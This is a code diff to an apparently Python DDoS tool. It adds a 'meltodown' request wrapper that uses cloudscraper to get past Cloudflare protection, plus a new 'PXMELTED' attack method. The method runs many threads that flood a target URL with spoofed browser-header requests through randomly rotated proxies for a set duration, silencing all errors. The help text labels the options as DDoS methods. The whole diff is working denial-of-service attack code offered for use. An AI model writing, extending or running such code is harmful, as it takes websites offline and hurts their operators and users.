@@ -117,6 +117,71 @@ def get_cookies_linux(url):
 
     return cookie_jar
 
+class meltodown:
+    def __init__(self, url, **kwargs):
+        self.url = url
+        self.user_agent = kwargs.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')
+        self.timeout = kwargs.get('timeout', {})
+        self.verify = kwargs.get('verify', {})
+        self.proxies = kwargs.get('proxies', {})
+        self.client = None
+        self.scraper = None
+    def __enter__(self):
+        try:
+            self.client = httpx.Client(timeout=self.timeout, verify=self.verify, proxies=self.proxies, headers={'User-Agent': self.user_agent})
+        except Exception as e:
+            self.client = None
+
+        try:
+            self.scraper = cloudscraper.create_scraper()
+        except Exception as e:
+            self.scraper = None
+
+        if self.client is None and self.scraper is None:
+            raise ValueError("Neither HTTPX Client nor Cloudscraper is initialized.")
+
+        return self
+
+    def __exit__(self, exc_type, exc_value, traceback):
+        if self.client:
+            self.client.close()
+
+    def _send_request(self, method, data=None, **kwargs):
+        headers = {'User-Agent': self.user_agent}
+        headers.update(kwargs.get('headers', {}))
+
+        try:
+            if self.client:
+                if method == 'GET':
+                    response = self.client.get(self.url, headers=headers)
+                elif method == 'POST':
+                    headers['Content-Type'] = 'application/json'
+                    response = self.client.post(self.url, headers=headers, data=data)
+                else:
+                    raise ValueError("Invalid HTTP method specified")
+            elif self.scraper:
+                if method == 'GET':
+                    response = self.scraper.get(self.url, headers=headers, timeout=self.timeout, proxies=self.proxies)
+                    response = requests.get(self.url, headers=headers, timeout=self.timeout, proxies=self.proxies)
+                elif method == 'POST':
+                    response = self.scraper.post(self.url, headers=headers, data=data, timeout=self.timeout, proxies=self.proxies)
+                    response = requests.post(self.url, headers=headers, data=data, timeout=self.timeout, proxies=self.proxies)
+                else:
+                    raise ValueError("Invalid HTTP method specified")
+            else:
+                raise ValueError("Neither HTTPX Client or Cloudscraper is initialized.")
+
+            response.raise_for_status()
+            return response.text
+        except Exception as e:
+            pass
+
+    def get(self, **kwargs):
+        return self._send_request('GET', **kwargs)
+
+    def post(self, data, **kwargs):
+        return self._send_request('POST', data, **kwargs)
+
 class Method:
     class PXHTTP2:
         def __init__(self, url, thread, time, proxy):
@@ -648,6 +713,54 @@ class Method:
         def start(self):
             return self.Attack()
 
+    class PXMELTED:
+        def __init__(self, url, thread, time, proxy):
+            self.proxy = proxy
+            self.url = url
+            self.thread = thread
+            self.time = time
+
+        # Memulai thread untuk melakukan attack
+        def Attack(self):
+            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
+            threads = []
+            for _ in range(self.thread):
+                thread = threading.Thread(target=self.PXMELTED, args=(self.url, until))
+                thread.start()
+                threads.append(thread)
+
+            for thread in threads:
+                thread.join()
+
+        def PXMELTED(self, url, until_datetime):
+            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+                headers = {
+                    'User-Agent': UserAgent().chrome,
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache',
+                    'Connection': 'keep-alive',
+                    'Upgrade-Insecure-Requests': '1',
+                    'Sec-Fetch-Dest': 'document',
+                    'Sec-Fetch-Mode': 'navigate',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-User': '?1',
+                    'TE': 'trailers',
+                }
+                try:
+                    with meltodown(url, proxies={
+                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                        }, headers=headers, timeout=30) as scrape:
+                        scrape.get()
+                except:
+                    pass
+
+        def start(self):
+            return self.Attack()
+
 class Runner:
     def __init__(self, args):
         self.args = args
@@ -662,7 +775,7 @@ if __name__ == '__main__':
     parser.add_argument('-t', '--time',type=str, help='DDoS Duration', metavar='45', default=45)
     parser.add_argument('-p', '--proxy', type=str, help='Proxy address', metavar='proxy.txt')
     parser.add_argument('-tpe', '--tpe', type=str, help='ThreadPoolExecutor', metavar='150-300', default=150)
-    parser.add_argument('-m', '--method', type=str, help='DDoS Method', metavar='PXHTTP2, HTTP2, PXCFB, PXREQ, PXBYP, PXROCKET, PXMIX, PXCFPRO, PXKILL, PXSOC, PXHOSHINO', required=True)
+    parser.add_argument('-m', '--method', type=str, help='DDoS Method', metavar='PXHTTP2, HTTP2, PXCFB, PXREQ, PXBYP, PXROCKET, PXMIX, PXCFPRO, PXKILL, PXSOC, PXHOSHINO, PXMELTED', required=True)
     args = parser.parse_args()
     if 'PX' in args.method:
         if args.proxy and exists(args.proxy):
